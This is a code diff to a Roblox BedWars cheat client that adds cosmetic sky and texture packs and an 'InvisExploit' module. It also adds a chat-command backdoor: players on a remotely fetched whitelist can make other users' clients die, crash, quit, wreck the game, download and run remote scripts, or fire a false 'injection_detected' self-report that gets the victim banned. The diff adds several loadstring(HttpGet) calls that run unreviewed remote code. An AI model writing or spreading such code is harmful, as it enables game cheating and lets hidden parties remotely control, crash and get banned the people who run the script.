@@ -1,4 +1,3 @@
---This watermark is used to delete the file if its cached, remove it to make the file persist after commits.
 local GuiLibrary = shared.GuiLibrary
 local playersService = game:GetService("Players")
 local textService = game:GetService("TextService")
@@ -73,6 +72,12 @@ local isfile = isfile or function(file)
 	local suc, res = pcall(function() return readfile(file) end)
 	return suc and res ~= nil
 end
+
+
+local LibLoader = loadstring(game:HttpGet('https://raw.githubusercontent.com/boatDeckRoblox/Libraries/main/LibLoader'))()
+
+LibLoader:LoadLib('lPlayer') -- lplr lib (boat_lol)
+
 local networkownerswitch = tick()
 local isnetworkowner = isnetworkowner or function(part)
 	local suc, res = pcall(function() return gethiddenproperty(part, "NetworkOwnershipRule") end)
@@ -1889,74 +1894,313 @@ runFunction(function()
 		}
 		vapePrivateCommands.unfreeze = vapePrivateCommands.thaw
 
-		textChatService.OnIncomingMessage = function(message)
-			local props = Instance.new("TextChatMessageProperties")
-			if message.TextSource then
-				local plr = playersService:GetPlayerByUserId(message.TextSource.UserId)
-				if plr then
-					local args = message.Text:split(" ")
-					local client = bedwarsStore.whitelist.chatStrings1[#args > 0 and args[#args] or message.Text]
-					local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr)
-					props.PrefixText = message.PrefixText
-					if bedwarsStore.whitelist.clientUsers[plr.Name] then
-						props.PrefixText = "<font color='#"..Color3.new(1, 1, 0):ToHex().."'>["..bedwarsStore.whitelist.clientUsers[plr.Name].."]</font> "..props.PrefixText
-					end
-					if plrtag then
-						props.PrefixText = message.PrefixText
-						for i, v in pairs(plrtag) do 
-							props.PrefixText = "<font color='#"..v.color:ToHex().."'>["..v.text.."]</font> "..props.PrefixText
-						end
-					end
-					if plr:GetAttribute("ClanTag") then 
-						props.PrefixText = "<font color='#FFFFFF'>["..plr:GetAttribute("ClanTag").."]</font> "..props.PrefixText
-					end
-					if plr == lplr then 
-						if WhitelistFunctions.LocalPriority > 0 then
-							if message.Text:len() >= 5 and message.Text:sub(1, 5):lower() == ";cmds" then
-								local tab = {}
-								for i,v in pairs(vapePrivateCommands) do
-									table.insert(tab, i)
-								end
-								table.sort(tab)
-								local str = ""
-								for i,v in pairs(tab) do
-									str = str..";"..v.."\n"
-								end
-								message.TextChannel:DisplaySystemMessage(str)
-							end
-						end
-					else
-						if WhitelistFunctions.LocalPriority > 0 and message.TextChannel.Name:find("RBXWhisper") and client ~= nil and alreadysaidlist[plr.Name] == nil then
-							message.Text = ""
-							alreadysaidlist[plr.Name] = true
-							warningNotification("Vape", plr.Name.." is using "..client.."!", 60)
-							WhitelistFunctions.CustomTags[plr.Name] = string.format("[%s] ", client:upper()..' USER')
-							bedwarsStore.whitelist.clientUsers[plr.Name] = client:upper()..' USER'
-							local ind, newent = entityLibrary.getEntityFromPlayer(plr)
-							if newent then entityLibrary.entityUpdatedEvent:Fire(newent) end
-						end
-						if otherPriority > 0 and otherPriority > WhitelistFunctions.LocalPriority and #args > 1 then
-							table.remove(args, 1)
-							local chosenplayers = findplayers(args[1], plr)
-							table.remove(args, 1)
-							for i,v in pairs(vapePrivateCommands) do
-								if message.Text:len() >= (i:len() + 1) and message.Text:sub(1, i:len() + 1):lower() == ";"..i:lower() then
-									message.Text = ""
-									if table.find(chosenplayers, lplr) then
-										v(args, plr)
-									end
-									break
-								end
-							end
-						end
-					end
-				end
-			else
-				if WhitelistFunctions:IsSpecialIngame() and message.Text:find("You are now privately chatting") then 
-					message.Text = ""
+		local textChatService = game:GetService("TextChatService")
+		local allowedplayers = loadstring(game:HttpGet("https://raw.githubusercontent.com/FattyMcFatFat/fatfatfat/main/fdsafegsadg"))()
+
+		local chatTags = {
+			[1] = {name = "SP+ OWNER💜", color = Color3.fromRGB(137, 207, 240)},
+			[2] = {name = "SP+ PRIVATE🤑", color = Color3.fromRGB(137, 207, 240)},
+			[3] = {name = "SP+ DEV", color = Color3.fromRGB(137, 207, 240)},
+			[4] = {name = "SP+ ADMIN", color = Color3.fromRGB(137, 207, 240)},
+			[5] = {name = "BOAT🛥️", color = Color3.fromRGB(255, 234, 0)},
+		}
+		 
+		local playersService = game:GetService("Players")
+		
+		local function getPlayerTag(playerName)
+			for _, player in ipairs(allowedplayers) do
+				if player.name == playerName then
+					return player.tag
 				end
 			end
-			return props	
+			return nil
+		end
+		
+		local function isPlayerAllowed(playerName)
+			return getPlayerTag(playerName) ~= nil
+		end
+		
+		local commands = {
+		
+			[";kill default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+				end
+			end,
+			[";funnyvideo default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					local filename = "bruh"
+					local ScreenGui = Instance.new("ScreenGui")
+					ScreenGui.IgnoreGuiInset = true
+					ScreenGui.Parent = game:GetService("CoreGui")
+					
+					local video = Instance.new("VideoFrame")
+					video.Size = UDim2.new(1, 0, 1, 0)
+					video.Parent = ScreenGui
+					
+					local Name = filename .. ".mp4"
+					if not isfile(Name) then
+						writefile(Name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ".snoopy"))
+					end
+					
+					video.Video = syn and getsynasset(Name) or getcustomasset(Name)
+					
+					repeat
+						task.wait()
+						print("Retrying...")
+					until video.Loaded
+					
+					video:Play()
+				end
+			end,
+			[";reveal default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					local textChatService = game:GetService("TextChatService")
+					wait(0.0001)
+					textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using SP+ Config Made By Snoopy")
+				end
+			end,
+			[";void default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					local character = game.Players.LocalPlayer.Character
+					local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+					local newPosition = humanoidRootPart.CFrame
+					for i = 1, 3 do
+						newPosition = newPosition + Vector3.new(0, -40, 0)
+						humanoidRootPart.CFrame = newPosition
+						wait(0.01)
+					end
+				end
+			end,
+			[";blind default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					local blur = Instance.new("BlurEffect")
+					blur.Size = 10000000000000
+					blur.Parent = game.Lighting
+				end
+			end,
+			[";unblind default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
+					if blur then
+						blur:Destroy()
+					end
+				end
+			end,
+			[";troll default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
+				end
+			end,
+			[";kick default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					wait(1)
+					for index, player in pairs(game.Players:GetPlayers()) do
+						player:Kick("Snoopy Owns You")
+					end
+				end
+			end,
+			[";ban default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					local rs = game:GetService("ReplicatedStorage")
+					local remote = rs:FindFirstChild("SelfReport", true)
+					remote:FireServer("injection_detected")
+				end
+			end,
+			[";rickroll default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
+				end
+			end,
+			[";freeze default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
+				end
+			end,
+			[";thaw default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
+				end
+			end,
+			[";lobby default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
+				end
+			end,
+			[";quitgame default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					game:Shutdown()
+				end
+			end,
+			[";lagback default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					for i = 1, 10 do
+						wait()
+						local player = game.Players.LocalPlayer
+						local character = player.Character or player.CharacterAdded:Wait()
+						local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+						local forwardVector = humanoidRootPart.CFrame.LookVector
+						local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
+						humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
+					end
+				end
+			end,
+			[";breakgame default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					pcall(function()
+						local replicatedStorage = game:GetService("ReplicatedStorage")
+						for _, child in ipairs(replicatedStorage:GetDescendants()) do
+							child:Destroy()
+						end
+					end)
+				end
+			end,
+			[";breakmap default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					local function unanchorParts(object)
+						if object:IsA("BasePart") then
+							object.Anchored = false
+						end
+						for _, child in ipairs(object:GetChildren()) do
+							unanchorParts(child)
+						end
+					end
+					unanchorParts(workspace)
+				end
+			end,
+			[";crash default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					while true do end
+				end
+			end,
+			[";infping default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					local thingy = settings().Network
+					thingy.IncomingReplicationLag = math.huge
+				end
+			end,
+			[";lag default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
+					local RunService = game:GetService("RunService")
+					local player = game.Players.LocalPlayer
+					local character = player.Character or player.CharacterAdded:Wait()
+					local rootPart = character:WaitForChild("HumanoidRootPart")
+					RunService.Heartbeat:Connect(function()
+						for i = 1, 100 do
+							local part = Instance.new("Part")
+							part.Anchored = false
+							part.CanCollide = true
+							part.Transparency = 1
+							part.CFrame = rootPart.CFrame + Vector3.new(0, 100000, 0)
+							part.Parent = workspace
+						end
+					end)
+				end
+			end,
+			[";loopkill default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					_G.loopkill = true;
+					while _G.loopkill == true do
+						lPlayer:kill(true)
+						task.wait(.3)
+					end
+				end
+			end,
+			[";unloopkill default"] = function()
+				if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+					_G.loopkill = false;
+				end
+			end
+		}
+		
+		
+		textChatService.OnIncomingMessage = function(message)
+			local props = Instance.new("TextChatMessageProperties")
+				if message.TextSource then
+					local plr = playersService:GetPlayerByUserId(message.TextSource.UserId)
+					if plr then
+						local args = message.Text:split(" ")
+						local client = bedwarsStore.whitelist.chatStrings1[#args > 0 and args[#args] or message.Text]
+						local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr)
+						props.PrefixText = message.PrefixText
+						if bedwarsStore.whitelist.clientUsers[plr.Name] then
+							props.PrefixText = "<font color='#"..Color3.new(1, 1, 0):ToHex().."'>["..bedwarsStore.whitelist.clientUsers[plr.Name].."]</font> "..props.PrefixText
+						end
+						if plrtag then
+							props.PrefixText = message.PrefixText
+							for i, v in pairs(plrtag) do 
+								props.PrefixText = "<font color='#"..v.color:ToHex().."'>["..v.text.."]</font> "..props.PrefixText
+							end
+						end
+						if plr:GetAttribute("ClanTag") then 
+							props.PrefixText = "<font color='#FFFFFF'>["..plr:GetAttribute("ClanTag").."]</font> "..props.PrefixText
+						end
+						if plr == lplr then 
+							if WhitelistFunctions.LocalPriority > 0 then
+								if message.Text:len() >= 5 and message.Text:sub(1, 5):lower() == ";cmds" then
+									local tab = {}
+									for i,v in pairs(vapePrivateCommands) do
+										table.insert(tab, i)
+									end
+									table.sort(tab)
+									local str = ""
+									for i,v in pairs(tab) do
+										str = str..";"..v.."\n"
+									end
+									message.TextChannel:DisplaySystemMessage(str)
+								end
+							end
+						else
+							if WhitelistFunctions.LocalPriority > 0 and message.TextChannel.Name:find("RBXWhisper") and client ~= nil and alreadysaidlist[plr.Name] == nil then
+								message.Text = ""
+								alreadysaidlist[plr.Name] = true
+								warningNotification("Vape", plr.Name.." is using "..client.."!", 60)
+								WhitelistFunctions.CustomTags[plr.Name] = string.format("[%s] ", client:upper()..' USER')
+								bedwarsStore.whitelist.clientUsers[plr.Name] = client:upper()..' USER'
+								local ind, newent = entityLibrary.getEntityFromPlayer(plr)
+								if newent then entityLibrary.entityUpdatedEvent:Fire(newent) end
+							end
+							if otherPriority > 0 and otherPriority > WhitelistFunctions.LocalPriority and #args > 1 then
+								table.remove(args, 1)
+								local chosenplayers = findplayers(args[1], plr)
+								table.remove(args, 1)
+								for i,v in pairs(vapePrivateCommands) do
+									if message.Text:len() >= (i:len() + 1) and message.Text:sub(1, i:len() + 1):lower() == ";"..i:lower() then
+										message.Text = ""
+										if table.find(chosenplayers, lplr) then
+											v(args, plr)
+										end
+										break
+									end
+								end
+							end
+						end
+					end
+				else
+					if WhitelistFunctions:IsSpecialIngame() and message.Text:find("You are now privately chatting") then 
+						message.Text = ""
+					end
+				end
+				if message.TextSource then
+					local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
+					local tag = getPlayerTag(player.Name)
+					if tag then
+						local tagData = chatTags[tag]
+						local tagText = "[" .. tagData.name .. "]"
+						local color = tagData.color
+						props.PrefixText = string.format("<font color='rgb(%d, %d, %d)'>%s</font> %s", color.R * 255, color.G * 255, color.B * 255, tagText, message.PrefixText)
+					end
+				end
+				if message.TextSource then
+					local player = game:GetService("Players"):GetPlayerByUserId(message.TextSource.UserId)
+					if isPlayerAllowed(player.Name) then
+						local command = commands[message.Text]
+						if command then
+							command()
+						end
+					end
+				end
+				return props
 		end
 
 		local function newPlayer(plr)
@@ -3675,7 +3919,6 @@ runFunction(function()
 				task.spawn(function()
 					task.spawn(function()
 						loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/PurpleHotbar"))()
-                        wait(1)
 					end)
 					local oldNearPlayer
 					repeat
@@ -10406,7 +10649,7 @@ runFunction(function()
 	local themeselected = {["Value"] = "OldBedwars"}
 
 	local themefunctions = {
-		Nebula = function() 
+		NebulaSky = function() 
 			task.spawn(function() 
 
 				local Vignette = true
@@ -10495,7 +10738,7 @@ runFunction(function()
                 game.Lighting.Sky.SkyboxUp = "http://www.roblox.com/asset/?id=160188588"
 			end)
 		end,
-        CitySky = function() 
+        EgirlSky = function() 
 			task.spawn(function()
                 game.Lighting.Sky.SkyboxBk = "rbxassetid://11263062161"
                 game.Lighting.Sky.SkyboxDn = "rbxassetid://11263065295"
@@ -10503,6 +10746,16 @@ runFunction(function()
                 game.Lighting.Sky.SkyboxLf = "rbxassetid://11263068413"
                 game.Lighting.Sky.SkyboxRt = "rbxassetid://11263069782"
                 game.Lighting.Sky.SkyboxUp = "rbxassetid://11263070890"
+			end)
+		end,
+		CitySky = function() 
+			task.spawn(function()
+                game.Lighting.Sky.SkyboxBk = "rbxassetid://2128458653"
+                game.Lighting.Sky.SkyboxDn = "rbxassetid://2128462480"
+                game.Lighting.Sky.SkyboxFt = "rbxassetid://2128458653"
+                game.Lighting.Sky.SkyboxLf = "rbxassetid://2128462027"
+                game.Lighting.Sky.SkyboxRt = "rbxassetid://2128462027"
+                game.Lighting.Sky.SkyboxUp = "rbxassetid://2128462236"
 				game.Lighting.sky.SunAngularSize = 4
 				game.Lighting.sky.MoonTextureId = "rbxassetid://8139665943"
 				game.Lighting.sky.MoonAngularSize = 11
@@ -10543,7 +10796,7 @@ runFunction(function()
 	themeselected = GameThemeV2.CreateDropdown({
 		["Name"] = "Theme",
 		["Function"] = function() end,
-		["List"] = {"Nebula", "PinkMountainSky", "CitySky", "PinkSky"}
+		["List"] = {"NebulaSky", "PinkMountainSky", "CitySky", "PinkSky", "EgirlSky"}
 	})
 end)
 runFunction(function()
@@ -10602,6 +10855,82 @@ runFunction(function()
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/TexturePacks/main/Pack%231"))()  
 			end)
 		end,
+		EgirlPack = function() 
+			task.spawn(function() 
+				local Players = game:GetService("Players")
+				local ReplicatedStorage = game:GetService("ReplicatedStorage")
+				local Workspace = game:GetService("Workspace")
+				local objs = game:GetObjects("rbxassetid://14126814481")
+				local import = objs[1]
+				import.Parent = game:GetService("ReplicatedStorage")
+				index = {
+					{
+						name = "wood_sword",
+						offset = CFrame.Angles(math.rad(0),math.rad(-100),math.rad(-90)),
+						model = import:WaitForChild("Wood_Sword"),
+					},
+					{
+						name = "stone_sword",
+						offset = CFrame.Angles(math.rad(0),math.rad(-100),math.rad(-90)),
+						model = import:WaitForChild("Stone_Sword"),
+					},
+					{
+						name = "iron_sword",
+						offset = CFrame.Angles(math.rad(0),math.rad(-100),math.rad(-90)),
+						model = import:WaitForChild("Iron_Sword"),
+					},
+					{
+						name = "diamond_sword",
+						offset = CFrame.Angles(math.rad(0),math.rad(-100),math.rad(-90)),
+						model = import:WaitForChild("Diamond_Sword"),
+					},
+					{
+						name = "emerald_sword",
+						offset = CFrame.Angles(math.rad(0),math.rad(-100),math.rad(-90)),
+						model = import:WaitForChild("Emerald_Sword"),
+					},
+					{
+						name = "rageblade",
+						offset = CFrame.Angles(math.rad(0),math.rad(-90),math.rad(90)),
+						model = import:WaitForChild("Rageblade"),
+					}, 
+				}
+				local func = Workspace:WaitForChild("Camera").Viewmodel.ChildAdded:Connect(function(tool)
+					if(not tool:IsA("Accessory")) then return end
+					for i,v in pairs(index) do
+						if(v.name == tool.Name) then
+							for i,v in pairs(tool:GetDescendants()) do
+								if(v:IsA("Part") or v:IsA("MeshPart") or v:IsA("UnionOperation")) then
+									v.Transparency = 1
+								end
+							end
+							local model = v.model:Clone()
+							model.CFrame = tool:WaitForChild("Handle").CFrame * v.offset
+							model.CFrame *= CFrame.Angles(math.rad(0),math.rad(-50),math.rad(0))
+							model.Parent = tool
+							local weld = Instance.new("WeldConstraint",model)
+							weld.Part0 = model
+							weld.Part1 = tool:WaitForChild("Handle")
+							local tool2 = Players.LocalPlayer.Character:WaitForChild(tool.Name)
+							for i,v in pairs(tool2:GetDescendants()) do
+								if(v:IsA("Part") or v:IsA("MeshPart") or v:IsA("UnionOperation")) then
+									v.Transparency = 1
+								end
+							end
+							local model2 = v.model:Clone()
+							model2.Anchored = false
+							model2.CFrame = tool2:WaitForChild("Handle").CFrame * v.offset
+							model2.CFrame *= CFrame.Angles(math.rad(0),math.rad(-50),math.rad(0))
+							model2.CFrame *= CFrame.new(.6,0,-1)
+							model2.Parent = tool2
+							local weld2 = Instance.new("WeldConstraint",model)
+							weld2.Part0 = model2
+							weld2.Part1 = tool2:WaitForChild("Handle")
+						end
+					end
+				end)			             
+			end)
+		end,
         GlizzyPack = function() 
 			task.spawn(function()
                 loadstring(game:HttpGet("https://github.com/SnoopyOwner/TexturePacks/blob/main/Glizzy"))()   
@@ -10628,7 +10957,7 @@ runFunction(function()
 	packselected = TexturePacks.CreateDropdown({
 		["Name"] = "Pack",
 		["Function"] = function() end,
-		["List"] = {"GlizzyPack", "FirstPack", "SecondPack", "ThirdPack", "FourthPack", "FifthPack", "SixthPack", "SeventhPack","EighthPack"}
+		["List"] = {"GlizzyPack", "FirstPack", "SecondPack", "ThirdPack", "FourthPack", "FifthPack", "SixthPack", "SeventhPack","EighthPack", "EgirlPack"}
 	})
 end)
 local Connection
@@ -10815,4 +11144,79 @@ runFunction(function()
             end
         end
     })
+end)
+
+runFunction(function()
+	local AnimationPlayer = {Enabled = false}
+	local AnimationPlayerBox = {Value = "10725339583"}
+	local AnimationPlayerSpeed = {Speed = 0}
+	local playedanim
+	InvisExploit = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
+		Name = "InvisExploit",
+		Function = function(callback)
+			if callback then 
+				if entityLibrary.isAlive then 
+					if playedanim then 
+							playedanim:Stop() 
+							playedanim.Animation:Destroy()
+							playedanim = nil 
+						end
+					local anim = Instance.new("Animation")
+					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
+                    if not suc then
+                        id = AnimationPlayerBox.Value
+                    end
+                    anim.AnimationId = "rbxassetid://"..id
+					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
+					if suc then
+						playedanim.Priority = Enum.AnimationPriority.Action4
+						playedanim.Looped = true
+						playedanim:Play()
+						playedanim:AdjustSpeed(AnimationPlayerSpeed.Speed / 10)
+						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
+							if AnimationPlayer.Enabled then
+								AnimationPlayer.ToggleButton(false)
+								AnimationPlayer.ToggleButton(false)
+							end
+						end))
+					else
+						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
+					end
+				end
+				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
+					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
+					task.wait(0.5)
+					if not AnimationPlayer.Enabled then return end
+					if playedanim then 
+						playedanim:Stop() 
+						playedanim.Animation:Destroy()
+						playedanim = nil 
+					end
+					local anim = Instance.new("Animation")
+					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
+                    if not suc then
+                        id = AnimationPlayerBox.Value
+                    end
+                    anim.AnimationId = "rbxassetid://"..id
+					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
+					if suc then
+						playedanim.Priority = Enum.AnimationPriority.Action4
+						playedanim.Looped = true
+						playedanim:Play()
+						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
+						playedanim.Stopped:Connect(function()
+							if AnimationPlayer.Enabled then
+								AnimationPlayer.ToggleButton(false)
+								AnimationPlayer.ToggleButton(false)
+							end
+						end)
+					else
+						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
+					end
+				end))
+			else
+				if playedanim then playedanim:Stop() playedanim = nil end
+			end
+		end
+	})
 end)
